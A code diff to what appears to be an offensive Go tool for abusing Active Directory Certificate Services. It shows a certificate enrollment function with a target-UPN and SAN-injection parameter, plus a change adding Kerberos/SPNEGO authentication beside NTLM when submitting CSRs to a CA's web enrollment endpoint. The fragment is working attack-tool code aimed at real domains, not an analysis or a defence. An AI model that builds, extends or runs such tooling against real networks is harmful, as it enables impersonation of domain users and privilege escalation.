@@ -120,7 +120,7 @@ func EnrollCertificate(cfg *ADCSConfig, templateName, targetUPN string, sanInjec
 	}
 
 	// Verify credentials for enrollment (password OR hash required)
-	if cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "") {
+	if cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "" && !cfg.Kerberos) {
 		fmt.Printf("[!] WARNING: No username/password/hash for enrollment NTLM auth\n")
 		fmt.Printf("[!] Falling back to offline mode (self-signed cert — will NOT work against real AD)\n")
 		return forgeFallback(certKey, targetUPN)
@@ -227,13 +227,23 @@ func submitCSRHTTP(cfg *ADCSConfig, caHostname string, csrDER []byte, templateNa
 		"SaveCert":         {"yes"},
 	}
 
-	client := newNTLMClient(cfg)
-
+	var client *http.Client
 	// Try HTTPS first, then HTTP
 	schemes := []string{"https", "http"}
 	var lastErr error
 
 	for _, scheme := range schemes {
+		if cfg.Kerberos {
+			var krbErr error
+			client, krbErr = newKerberosHTTPClient(cfg)
+			if krbErr != nil {
+				lastErr = fmt.Errorf("Kerberos HTTP client: %w", krbErr)
+				continue
+			}
+			fmt.Println("[*] Using Kerberos/SPNEGO for web enrollment")
+		} else {
+			client = newNTLMClient(cfg)
+		}
 		// Pre-flight: GET /certsrv/ to establish NTLM session and cookies.
 		// Some certsrv configurations reject direct POSTs without an active session.
 		preflightURL := fmt.Sprintf("%s://%s/certsrv/", scheme, caHostname)
